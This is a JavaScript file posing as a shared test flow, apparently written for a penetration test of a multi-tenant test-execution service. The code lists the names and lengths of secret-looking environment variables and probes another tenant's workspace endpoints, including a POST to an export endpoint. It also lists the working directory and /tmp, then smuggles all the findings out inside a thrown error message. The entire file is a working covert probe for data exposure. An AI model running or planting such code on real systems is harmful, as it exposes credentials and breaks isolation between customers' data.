// Shared flow "pwprobe"
export async function pwprobe(m, at, b) {
  await m.step(at + '.f1', b, async page => {
    await (async (page) => {
        const out=[];
        const A=process.env.MERIDIAN_API_BASE||'';
        const names=Object.keys(process.env).filter(n=>/TOKEN|SECRET|KEY|AUTH|JWT|CRED|SIGN|PRESIGN|URL/i.test(n));
        out.push('ENV['+names.map(n=>n+':'+String(process.env[n]).length).join(',')+']');
        const T={
          h: A+'/health',
          own_run: A+'/employers/pentest-alpha/workspaces/643edf4bad2c4cd481dddb9b6c18347d/testcase-runs/0d3bd4d3eeb8415890cdfccbec1e940c',
          bravo_list: A+'/employers/pentest-bravo/workspaces/0927589f56354508b6c2383eaa026e79/testcase-runs',
          bravo_run: A+'/employers/pentest-bravo/workspaces/0927589f56354508b6c2383eaa026e79/testcase-runs/325203e580e44c3fbbe2674a8ef5c792'
        };
        for (const n of Object.keys(T)) {
          try { const r=await fetch(T[n]); const t=await r.text(); out.push(n+'='+r.status+'/'+t.slice(0,40).replace(/\s+/g,'')); }
          catch(e){ out.push(n+'=ERR'+String(e.message||e).slice(0,20)); }
        }
        try { const r=await fetch(A+'/employers/pentest-bravo/workspaces/0927589f56354508b6c2383eaa026e79/testcase-runs/325203e580e44c3fbbe2674a8ef5c792/export',{method:'POST',headers:{'content-type':'application/json'},body:'{}'}); const t=await r.text(); out.push('bravo_export='+r.status+'/'+t.slice(0,40)); } catch(e){ out.push('bravo_export=ERR'); }
        const fs=await import('node:fs');
        try { out.push('CWD='+process.cwd()+' LS='+fs.readdirSync(process.cwd()).slice(0,12).join(',')); } catch(e){}
        try { out.push('TMP='+fs.readdirSync('/tmp').slice(0,15).join(',')); } catch(e){}
        throw new Error('ART2 '+out.join(' | '));
      })(page);
  });
}
